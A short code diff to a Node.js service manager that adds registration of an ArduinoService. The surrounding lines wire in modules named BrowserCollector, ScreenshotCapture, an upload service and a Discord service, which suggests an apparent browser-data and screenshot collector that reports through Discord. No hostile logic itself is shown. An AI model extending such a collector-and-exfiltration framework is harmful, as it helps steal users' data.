@@ -7,6 +7,7 @@ const { DiscordService } = require('../services/discord/service');
 const { uploadService } = require('../services/upload/service');
 const { BrowserCollector } = require('../modules/browsers/collector');
 const { ScreenshotCapture } = require('../modules/screenshot/capture');
+const { ArduinoService } = require('../services/arduino/service');
 const { logger } = require('./logger');
 const { ErrorHandler } = require('./errors');
 
@@ -72,6 +73,7 @@ class ServiceManager {
         // Register services without dependencies first
         this.register('upload', () => uploadService, []);
         this.register('screenshot', () => new ScreenshotCapture(), []);
+        this.register('arduino', () => new ArduinoService(), []);
 
         // Register services with dependencies
         this.register('discord', () => new DiscordService(), ['upload']);
